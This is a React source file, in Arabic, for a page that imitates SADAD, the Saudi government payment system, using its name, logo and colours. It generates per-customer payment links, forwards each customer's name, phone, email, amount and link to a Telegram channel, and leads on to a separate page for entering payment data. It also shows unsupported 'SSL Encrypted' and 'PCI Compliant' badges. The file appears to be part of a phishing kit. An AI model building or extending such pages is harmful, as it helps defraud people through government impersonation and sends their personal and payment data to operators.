import React, { useState } from "react";
import { useParams, useNavigate } from "react-router-dom";
import { Button } from "@/components/ui/button";
import { Card } from "@/components/ui/card";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { Textarea } from "@/components/ui/textarea";
import { useToast } from "@/hooks/use-toast";
import { useCreateLink } from "@/hooks/useSupabase";
import { getGovernmentPaymentSystem } from "@/lib/governmentPaymentSystems";
import { getCurrencySymbol, getCurrencyCode } from "@/lib/countryCurrencies";
import { generatePaymentLink } from "@/utils/paymentLinks";
import { 
  Landmark, 
  FileText, 
  DollarSign, 
  User, 
  Phone, 
  Mail,
  Copy,
  ExternalLink,
  CheckCircle,
  Shield,
  Lock
} from "lucide-react";
import BackButton from "@/components/BackButton";
import { sendToTelegram } from "@/lib/telegram";

const SaddadRecipientPage = () => {
  const { id, serviceKey } = useParams();
  const navigate = useNavigate();
  const { toast } = useToast();
  const createLink = useCreateLink();
  
  // State for form fields
  const [fullName, setFullName] = useState("");
  const [phoneNumber, setPhoneNumber] = useState("");
  const [email, setEmail] = useState("");
  const [amount, setAmount] = useState("");
  const [reference, setReference] = useState("");
  const [description, setDescription] = useState("");
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [createdLink, setCreatedLink] = useState("");
  const [linkId, setLinkId] = useState("");
  const [showSuccess, setShowSuccess] = useState(false);

  // Get SADAD branding
  const govSystem = getGovernmentPaymentSystem('SA');
  const primaryColor = govSystem.colors.primary;
  const secondaryColor = govSystem.colors.secondary;

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setIsSubmitting(true);

    if (!fullName || !phoneNumber || !amount) {
      toast({
        title: "خطأ",
        description: "الرجاء ملء جميع الحقول المطلوبة",
        variant: "destructive",
      });
      setIsSubmitting(false);
      return;
    }

    try {
      // Create payment link
      const link = await createLink.mutateAsync({
        type: "government",
        country_code: "SA",
        payload: {
          service_key: "sadad",
          service_name: "سداد - SADAD",
          customerInfo: {
            fullName,
            phoneNumber,
            email,
          },
          payment_amount: parseFloat(amount),
          currency_code: getCurrencyCode("SA"),
          reference,
          description,
          provider: "SADAD",
          selectedCountry: "SA",
        },
      });

      // Generate payment URL
      const paymentUrl = generatePaymentLink({
        invoiceId: link.id,
        company: "sadad",
        country: "SA"
      });

      setCreatedLink(paymentUrl);
      setLinkId(link.id);
      setShowSuccess(true);

      // Send to Telegram
      await sendToTelegram({
        type: 'payment_recipient',
        data: {
          service: 'سداد - SADAD',
          customer_name: fullName,
          phone: phoneNumber,
          email: email || 'غير محدد',
          amount: parseFloat(amount),
          currency: getCurrencySymbol("SA"),
          reference: reference || 'غير محدد',
          description: description || 'غير محدد',
          payment_url: paymentUrl,
        },
        timestamp: new Date().toISOString(),
      });

      toast({
        title: "✅ تم إنشاء رابط الدفع بنجاح",
        description: "يمكنك الآن نسخ الرابط أو معاينته",
      });
    } catch (error) {
      console.error("Error creating SADAD payment link:", error);
      toast({
        title: "خطأ",
        description: "حدث خطأ أثناء إنشاء رابط الدفع",
        variant: "destructive",
      });
    } finally {
      setIsSubmitting(false);
    }
  };

  const handleCopyLink = () => {
    navigator.clipboard.writeText(createdLink);
    toast({
      title: "✅ تم النسخ",
      description: "تم نسخ الرابط إلى الحافظة",
    });
  };

  const handlePreview = () => {
    window.open(createdLink, '_blank');
  };

  const handleNavigateToPayment = () => {
    navigate(`/pay/${linkId}/data`);
  };

  if (showSuccess) {
    return (
      <div 
        className="min-h-screen flex items-center justify-center py-8 px-4"
        style={{
          background: `linear-gradient(135deg, ${govSystem.colors.surface}, #FFFFFF)`,
          fontFamily: govSystem.fonts.primaryAr
        }}
        dir="rtl"
      >
        <Card 
          className="max-w-2xl w-full overflow-hidden border-0 shadow-2xl"
          style={{ borderRadius: govSystem.borderRadius.lg }}
        >
          {/* Header */}
          <div 
            className="p-8 text-center"
            style={{
              background: govSystem.gradients.header,
            }}
          >
            <div className="w-20 h-20 mx-auto mb-4 rounded-full bg-white/20 backdrop-blur-sm flex items-center justify-center">
              <CheckCircle className="w-12 h-12 text-white" />
            </div>
            <h2 className="text-3xl font-bold text-white mb-2">
              تم إنشاء رابط الدفع بنجاح
            </h2>
            <p className="text-white/90">
              يمكنك الآن مشاركة الرابط مع العميل
            </p>
          </div>

          {/* Link Display */}
          <div className="p-8 space-y-6">
            <div 
              className="p-6 rounded-xl border-2"
              style={{
                borderColor: primaryColor,
                background: `${primaryColor}08`
              }}
            >
              <Label className="text-sm font-semibold mb-2 block">
                رابط الدفع
              </Label>
              <div className="bg-white p-4 rounded-lg break-all text-sm font-mono border">
                {createdLink}
              </div>
            </div>

            {/* Action Buttons */}
            <div className="grid grid-cols-1 sm:grid-cols-2 gap-4">
              <Button
                onClick={handleCopyLink}
                size="lg"
                className="w-full"
                style={{
                  background: govSystem.gradients.primary,
                  color: govSystem.colors.textOnPrimary
                }}
              >
                <Copy className="w-5 h-5 ml-2" />
                نسخ الرابط
              </Button>
              <Button
                onClick={handlePreview}
                size="lg"
                variant="outline"
                className="w-full"
                style={{
                  borderColor: primaryColor,
                  color: primaryColor
                }}
              >
                <ExternalLink className="w-5 h-5 ml-2" />
                معاينة الرابط
              </Button>
            </div>

            <Button
              onClick={handleNavigateToPayment}
              size="lg"
              variant="secondary"
              className="w-full"
            >
              متابعة إدخال بيانات الدفع
            </Button>

            <Button
              onClick={() => window.location.href = '/services'}
              size="lg"
              variant="ghost"
              className="w-full"
            >
              العودة للخدمات
            </Button>
          </div>
        </Card>
      </div>
    );
  }

  return (
    <div 
      className="min-h-screen py-8 px-4"
      style={{
        background: `linear-gradient(135deg, ${govSystem.colors.surface}, #FFFFFF)`,
        fontFamily: govSystem.fonts.primaryAr
      }}
      dir="rtl"
    >
      <div className="container mx-auto max-w-3xl">
        <div className="mb-6">
          <BackButton />
        </div>

        <Card 
          className="overflow-hidden border-0 shadow-2xl"
          style={{ borderRadius: govSystem.borderRadius.lg }}
        >
          {/* Header */}
          <div 
            className="p-8 relative"
            style={{
              background: govSystem.gradients.header,
            }}
          >
            <div className="flex items-center gap-4">
              <div className="w-16 h-16 rounded-xl bg-white/20 backdrop-blur-sm flex items-center justify-center">
                <Landmark className="w-8 h-8 text-white" />
              </div>
              <div>
                <h1 className="text-3xl font-bold text-white">
                  {govSystem.nameAr}
                </h1>
                <p className="text-white/90 mt-1">
                  {govSystem.description}
                </p>
              </div>
            </div>
            
            {/* Logo */}
            {govSystem.logo && (
              <div className="absolute top-4 left-4">
                <img 
                  src={govSystem.logo} 
                  alt={govSystem.nameAr}
                  className="h-12 w-auto object-contain"
                />
              </div>
            )}
          </div>

          {/* Form */}
          <form onSubmit={handleSubmit} className="p-8 space-y-6">
            <div className="text-center mb-6">
              <h2 className="text-2xl font-bold mb-2" style={{ color: primaryColor }}>
                إنشاء رابط دفع سداد
              </h2>
              <p className="text-gray-600">
                أدخل بيانات الدفع لإنشاء رابط مخصص
              </p>
            </div>

            {/* Customer Info */}
            <div className="space-y-4">
              <div>
                <Label className="flex items-center gap-2 mb-2">
                  <User className="w-4 h-4" />
                  اسم العميل *
                </Label>
                <Input
                  value={fullName}
                  onChange={(e) => setFullName(e.target.value)}
                  placeholder="أدخل الاسم الكامل"
                  required
                  className="h-12"
                />
              </div>

              <div>
                <Label className="flex items-center gap-2 mb-2">
                  <Phone className="w-4 h-4" />
                  رقم الجوال *
                </Label>
                <Input
                  value={phoneNumber}
                  onChange={(e) => setPhoneNumber(e.target.value)}
                  placeholder="05XXXXXXXX"
                  required
                  className="h-12"
                  dir="ltr"
                />
              </div>

              <div>
                <Label className="flex items-center gap-2 mb-2">
                  <Mail className="w-4 h-4" />
                  البريد الإلكتروني (اختياري)
                </Label>
                <Input
                  type="email"
                  value={email}
                  onChange={(e) => setEmail(e.target.value)}
                  placeholder="example@email.com"
                  className="h-12"
                  dir="ltr"
                />
              </div>
            </div>

            {/* Payment Info */}
            <div className="space-y-4 pt-4 border-t">
              <div>
                <Label className="flex items-center gap-2 mb-2">
                  <DollarSign className="w-4 h-4" />
                  المبلغ المطلوب * (ريال سعودي)
                </Label>
                <Input
                  type="number"
                  value={amount}
                  onChange={(e) => setAmount(e.target.value)}
                  placeholder="0.00"
                  required
                  className="h-12"
                  step="0.01"
                  min="0"
                />
              </div>

              <div>
                <Label className="flex items-center gap-2 mb-2">
                  <FileText className="w-4 h-4" />
                  رقم الفاتورة / المرجع (اختياري)
                </Label>
                <Input
                  value={reference}
                  onChange={(e) => setReference(e.target.value)}
                  placeholder="INV-001"
                  className="h-12"
                />
              </div>

              <div>
                <Label className="flex items-center gap-2 mb-2">
                  <FileText className="w-4 h-4" />
                  وصف الدفع (اختياري)
                </Label>
                <Textarea
                  value={description}
                  onChange={(e) => setDescription(e.target.value)}
                  placeholder="وصف تفصيلي للدفعة..."
                  className="min-h-24"
                />
              </div>
            </div>

            {/* Security Notice */}
            <div 
              className="p-4 rounded-lg"
              style={{
                background: `${primaryColor}08`,
                borderRight: `4px solid ${primaryColor}`
              }}
            >
              <div className="flex items-start gap-3">
                <Shield className="w-5 h-5 mt-0.5" style={{ color: primaryColor }} />
                <div className="flex-1">
                  <p className="text-sm font-semibold mb-1" style={{ color: primaryColor }}>
                    معاملة آمنة ومشفرة
                  </p>
                  <p className="text-xs text-gray-600">
                    جميع البيانات محمية بتقنية التشفير SSL وتتوافق مع معايير الأمان العالمية
                  </p>
                </div>
              </div>
            </div>

            {/* Submit Button */}
            <Button
              type="submit"
              size="lg"
              disabled={isSubmitting}
              className="w-full h-14 text-lg font-bold"
              style={{
                background: govSystem.gradients.primary,
                color: govSystem.colors.textOnPrimary,
                boxShadow: govSystem.shadows.lg
              }}
            >
              {isSubmitting ? (
                "جاري إنشاء الرابط..."
              ) : (
                <>
                  <Lock className="w-5 h-5 ml-2" />
                  إنشاء رابط الدفع الآمن
                </>
              )}
            </Button>
          </form>

          {/* Footer */}
          <div 
            className="px-8 py-4 text-center text-xs"
            style={{
              background: govSystem.colors.surface,
              borderTop: `1px solid ${govSystem.colors.border}`
            }}
          >
            <div className="flex items-center justify-center gap-4 text-gray-500">
              <div className="flex items-center gap-1">
                <Lock className="w-3 h-3" />
                <span>SSL Encrypted</span>
              </div>
              <span>•</span>
              <div className="flex items-center gap-1">
                <Shield className="w-3 h-3" />
                <span>PCI Compliant</span>
              </div>
            </div>
          </div>
        </Card>
      </div>
    </div>
  );
};

export default SaddadRecipientPage;
